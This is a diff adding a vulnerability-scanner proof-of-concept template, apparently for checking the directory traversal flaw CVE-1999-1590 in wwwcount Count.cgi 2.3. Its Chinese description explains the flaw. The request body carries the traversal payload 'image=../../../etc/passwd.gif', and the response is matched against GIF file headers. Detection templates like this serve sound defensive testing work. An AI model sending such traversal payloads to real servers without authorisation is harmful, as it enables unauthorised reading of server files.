@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = '检测wwwcount (Count.cgi) 2.3 版本的目录遍历漏洞。该漏洞允许攻击者通过image参数中的".."路径回溯序列读取服务器上任意位置的GIF文件。验证时构建包含路径回溯序列的恶意HTTP请求，发送到Count.cgi端点，并检查响应是否包含预期GIF文件内容。'
+id = "POC-AVE-1999-1207"
+name = "wwwcount目录遍历漏洞PoC"
+severity = "medium"
+tags = ["ave-1999-1207"]
+vuln_id = [
+    "CVE-1999-1590",
+    "AVE-1999-1207",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/Count.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "image=../../../etc/passwd.gif"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "GIF87a",
+    "GIF89a",
+]
